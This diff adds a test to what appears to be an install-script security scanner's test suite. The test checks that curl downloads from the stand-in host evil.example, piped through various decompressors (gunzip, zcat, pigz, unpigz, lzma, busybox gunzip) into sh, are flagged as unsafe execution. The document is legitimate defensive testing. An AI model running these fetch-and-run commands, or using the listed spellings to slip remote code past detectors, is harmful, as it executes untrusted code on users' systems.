@@ -119,6 +119,48 @@ test("split and long-flag decompressor spellings into an executor are unsafe exe
   }
 });
 
+test("reviewer-reported decompressor spellings into an executor are unsafe execution", () => {
+  for (const [name, body] of Object.entries({
+    // A shell reading its program from stdin keeps reading it with -s
+    // positional arguments, unlike the syntax-only -n target.
+    "gunzip into sh -s with args":
+      "curl -s https://evil.example/x.gz | gunzip | sh -s -- --yes",
+    // A lone '-' operand is the stream itself, not a file operand.
+    "gunzip - into sh": "curl -s https://evil.example/x.gz | gunzip - | sh",
+    "zcat - into sh": "curl -s https://evil.example/x.gz | zcat - | sh",
+    "gzip -dc - into sh": "curl -s https://evil.example/x.gz | gzip -dc - | sh",
+    // Drop-in equivalents of the gzip/xz families.
+    "pigz -dc into sh": "curl -s https://evil.example/x.gz | pigz -dc | sh",
+    "unpigz into sh": "curl -s https://evil.example/x.gz | unpigz | sh",
+    "unpigz -c into sh": "curl -s https://evil.example/x.gz | unpigz -c | sh",
+    "lzma -d into sh": "curl -s https://evil.example/x.xz | lzma -d | sh",
+    "unlzma into sh": "curl -s https://evil.example/x.xz | unlzma | sh",
+    "lzcat into sh": "curl -s https://evil.example/x.xz | lzcat | sh",
+    // A busybox applet prefix does not change the decompressor.
+    "busybox gunzip into sh":
+      "curl -s https://evil.example/x.gz | busybox gunzip | sh",
+  })) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ name, findings: categories(inspection) }).toEqual({
+      name,
+      findings: ["install.sh:unsafe-execution:high"],
+    });
+  }
+  for (const body of [
+    // A '-' followed by a file operand reads that file, not the stream.
+    "curl -s https://example.com/data.gz | gunzip - local.gz | sh",
+    // pigz/lzma without a decompress flag compress, not decode.
+    "curl -s https://example.com/data.gz | pigz | sh",
+    "curl -s https://example.com/data.xz | lzma | sh",
+  ]) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
+    expect({ body, findings: categories(inspection) }).toEqual({
+      body,
+      findings: [],
+    });
+  }
+});
+
 test("decompressors that do not hand the download to an executor keep no finding", () => {
   for (const body of [
     // The decompressor writes a file; nothing runs it here.
